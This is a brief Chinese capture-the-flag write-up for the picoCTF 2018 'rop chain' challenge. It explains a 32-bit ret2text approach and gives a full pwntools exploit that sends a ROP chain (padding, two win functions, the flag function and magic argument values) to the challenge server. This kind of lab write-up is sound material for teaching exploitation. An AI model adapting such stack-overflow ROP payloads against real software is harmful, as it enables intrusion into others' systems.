# 分析

来自[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#picoctf_2018_rop chain)

这是一道ret2text(32)，关键在于修改变量参数使条件成立getshell

# exp

```python
from pwn import *
context(os='linux',arch='i386',log_level='debug')
p=remote('node5.buuoj.cn',29600)
#p=process('./PicoCTF_2018_rop_chain')
elf=ELF('./PicoCTF_2018_rop_chain')
flag_addr=elf.sym['flag']
win1=elf.sym['win_function1']
win2=elf.sym['win_function2']
payload1=flat(cyclic(0x1c),p32(win1),p32(win2),p32(flag_addr),p32(0xBAAAAAAD),p32(0xDEADBAAD))
#win1是进入此函数，使win=1成立，
#win2是win1执行完的返回地址，再进去win2执行
#flag_addr是win2执行完的返回地址，再进去执行,flag_addr
#0xBAAAAAAD是执行win2中传入的参数，
#0xDEADBAAD是执行flag中传入的参数，当进入flag_addr执行时，0xBAAAAAAD会被当做返回地址，而后者就是参数
p.sendlineafter('input> ',payload1)
p.recv()
```

